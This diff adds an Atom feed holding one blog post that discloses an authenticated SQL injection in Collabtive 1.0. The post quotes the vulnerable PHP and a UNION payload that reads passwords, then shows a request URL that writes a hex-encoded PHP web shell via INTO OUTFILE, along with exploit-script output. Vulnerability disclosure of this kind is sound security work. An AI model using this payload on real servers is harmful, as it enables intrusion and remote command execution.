@@ -1,0 +1,109 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: collabtive | ]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/collabtive/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2018-05-18T09:39:16-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Collabtive 1.0 - SQLi]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli/"/>
+    <updated>2013-06-21T22:40:53-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli</id>
+    <content type="html"><![CDATA[<p><a href="http://collabtive.o-dyn.de/">Collabtive</a> is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found <a href="http://sourceforge.net/projects/collabtive/?source=directory">here</a>, which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github <a href="https://github.com/philippK-de/Collabtive">repository</a>.</p>
+
+<p>User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:</p>
+
+<p>```
+ if (!empty($start) and !empty($end)) {</p>
+
+<pre><code>    $track = $tracker-&gt;getUserTrack($id, $fproject, $taski, $start, $end);
+} elseif (is_array($fproject)) {
+    foreach ($fproject as $fpro) {
+        $ptrack = $tracker-&gt;getUserTrack($id, $fpro, $taski, $start, $end);
+        if (!empty($ptrack)) {
+            foreach ($ptrack as $mytrack) {
+                array_push($track, $mytrack);
+            }
+        }
+    }
+} 
+</code></pre>
+
+<p>```</p>
+
+<p>Of interest is the <code>getUserTrack</code> function, as follows:</p>
+
+<p>```
+function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)</p>
+
+<pre><code>{
+    global $conn;
+    $user = (int) $user;
+    $project = (int) $project;
+    $lim = (int) $lim;
+
+    if ($project &gt; 0) {
+        $sql = "SELECT * FROM timetracker WHERE user = $user AND project = $project";
+        $num = "SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user";
+        $order = " ORDER BY ended ASC";
+    } else {
+        $sql = "SELECT * FROM timetracker WHERE user = $user";
+        $num = "SELECT COUNT(*) FROM timetracker WHERE user = $user";
+        $order = " ORDER BY ended ASC";
+    }
+
+    if ($task &gt; 0) {
+        $sql .= " AND task = $task";
+        $num .= " AND task = $task";
+    }
+
+    if ($start &gt; 0 and $end &gt; 0) {
+        $start = strtotime($start);
+        $end = strtotime($end . " +1 day");
+        $end = $end - 1;
+        $sql .= " AND ended &gt;=$start AND ended&lt;=$end ";
+        $num .= " AND ended &gt;=$start AND ended&lt;=$end ";
+    }
+
+    if ($num) {
+        $num = $conn-&gt;query($num)-&gt;fetch();
+        $num = $num[0];
+    } else {
+        $num = 0;
+    }
+</code></pre>
+
+<p>```</p>
+
+<p>The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn&rsquo;t do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, <code>task=1 UNION SELECT passwords FROM user</code>.  Thus we highlight the importance of parameterized queries.  Just use them.</p>
+
+<p>This can be exploited with a simple UNION query to drop a shell:</p>
+
+<p><code>
+http://192.168.1.219/collabtive/manageuser.php?action=profile&amp;id=1&amp;task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&amp;project=1
+</code></p>
+
+<p>Exploiting:</p>
+
+<p><code>
+root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
+[!] Dropping web shell on 192.168.1.83...
+[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls
+</code></p>
+
+<p><img class="center <a" src="href="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg">http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg</a>"></p>
+
+<p><a href="http://www.exploit-db.com/exploits/26410/">Exploit</a></p>
+]]></content>
+  </entry>
+  
+</feed>
